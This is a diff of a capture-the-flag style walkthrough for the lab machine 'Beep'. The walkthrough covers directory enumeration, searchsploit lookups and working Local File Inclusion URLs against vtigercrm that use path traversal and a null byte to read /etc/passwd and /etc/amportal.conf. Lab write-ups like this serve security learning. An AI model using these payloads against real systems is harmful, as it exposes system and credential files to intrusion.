@@ -19,13 +19,14 @@ gobuster dir -u https://10.10.10.7 -w ~/wordlists/big.txt -t 100 -e -x php,html,
 A lot of things to check, but i had never saw the folder vtigercrm, so i started with it  
 ![alt text](./img/beep03.PNG?raw=true)  
 
+We have the app version, so let's try to find some exploit to it  
 searchsploit vtiger 5.1  
 ![alt text](./img/beep04.PNG?raw=true)  
 
 searchsploit -x php/webapps/18770.txt  
 ![alt text](./img/beep05.PNG?raw=true)  
 
-So let’s try to use this URL, only changing the LOCALHOST to 10.10.10.7  
+It is vulnerable do LFI (Local File Inclusion)...so let’s try to use this URL, only changing the LOCALHOST to 10.10.10.7  
 https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00  
 ![alt text](./img/beep06.PNG?raw=true)  
 
@@ -42,7 +43,7 @@ The LFI caught my attention because it could show me another important file to e
 searchsploit -x php/webapps/37637.pl  
 ![alt text](./img/beep09.PNG?raw=true)  
 
-Ok, it’s another LFI vector, but it give other file as POC. Let’s try to read it, you can choode this new url or the old one  
+Ok, it’s another LFI vector, but it give other file as POC. Let’s try to read it, you can choose this new url or the old one  
 - https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action  
 - https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/amportal.conf%00  
 
